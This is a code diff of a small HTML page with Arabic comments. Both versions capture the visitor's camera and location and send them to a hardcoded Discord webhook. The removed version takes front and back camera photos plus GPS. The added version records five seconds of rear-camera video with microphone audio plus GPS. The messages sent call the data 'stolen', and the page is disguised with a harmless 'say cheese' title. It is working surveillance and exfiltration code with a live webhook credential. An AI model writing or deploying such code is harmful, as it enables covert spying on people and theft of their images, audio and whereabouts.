@@ -1,36 +1,10 @@
 <html>
   <body>
-    <h1>تجربة تصوير كاميرا أمامية وخلفية + GPS</h1>
-    <button id="start">ابدأ التصوير والإرسال</button>
-    <video id="video" autoplay style="display:none;"></video>
+    <h1>قول كاسه</h1>
+    <button id="start">ابدأ التسجيل والإرسال</button>
 
     <script>
       const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";
-
-      async function captureImage(facingMode) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-          const video = document.getElementById('video');
-          video.srcObject = stream;
-
-          await new Promise(resolve => {
-            video.onloadedmetadata = () => resolve();
-          });
-
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // نوقف الكاميرا بعد التصوير
-          stream.getTracks().forEach(track => track.stop());
-
-          return canvas.toDataURL('image/png');
-        } catch (e) {
-          return null;
-        }
-      }
 
       function dataURItoBlob(dataURI) {
         const byteString = atob(dataURI.split(',')[1]);
@@ -44,37 +18,53 @@
       }
 
       document.getElementById('start').onclick = async () => {
-        // نصور الكاميرا الأمامية
-        const frontImage = await captureImage('user');
-        // نصور الكاميرا الخلفية
-        const backImage = await captureImage('environment');
+        try {
+          // نطلب الكاميرا والمايك مع الكاميرا الخلفية (لو تبغا)
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
 
-        // نجيب الموقع
-        navigator.geolocation.getCurrentPosition(position => {
-          // نبني فورم داتا نرسلها للويب هوك
-          const formData = new FormData();
-          formData.append('content', `تم سرقة الموقع: \nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`);
+          // نسوي تسجيل بالفيديو
+          const mediaRecorder = new MediaRecorder(stream);
+          let chunks = [];
 
-          if (frontImage) formData.append('file', dataURItoBlob(frontImage), 'front.png');
-          if (backImage) formData.append('file', dataURItoBlob(backImage), 'back.png');
+          mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
-          fetch(webhookURL, {
-            method: 'POST',
-            body: formData
-          });
-        }, err => {
-          // لو رفض الموقع نرسل بدون الموقع
-          const formData = new FormData();
-          formData.append('content', 'تم سرقة الصور ولكن الموقع مرفوض');
+          mediaRecorder.start();
 
-          if (frontImage) formData.append('file', dataURItoBlob(frontImage), 'front.png');
-          if (backImage) formData.append('file', dataURItoBlob(backImage), 'back.png');
+          // نسوي توقيت 5 ثواني
+          await new Promise(resolve => setTimeout(resolve, 5000));
 
-          fetch(webhookURL, {
-            method: 'POST',
-            body: formData
-          });
-        });
+          mediaRecorder.stop();
+
+          // نوقف الستريم عشان ما يظل يشغل الكاميرا والمايك
+          mediaRecorder.onstop = async () => {
+            stream.getTracks().forEach(track => track.stop());
+
+            const blob = new Blob(chunks, { type: 'video/webm' });
+
+            // نجيب الموقع
+            navigator.geolocation.getCurrentPosition(position => {
+              const formData = new FormData();
+              formData.append('content', `تم سرقة الفيديو والموقع:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`);
+              formData.append('file', blob, 'video.webm');
+
+              fetch(webhookURL, {
+                method: 'POST',
+                body: formData
+              });
+            }, err => {
+              const formData = new FormData();
+              formData.append('content', 'تم سرقة الفيديو لكن الموقع مرفوض');
+              formData.append('file', blob, 'video.webm');
+
+              fetch(webhookURL, {
+                method: 'POST',
+                body: formData
+              });
+            });
+          };
+        } catch (err) {
+          alert('رفضت الإذن أو صار خطأ');
+        }
       }
     </script>
   </body>
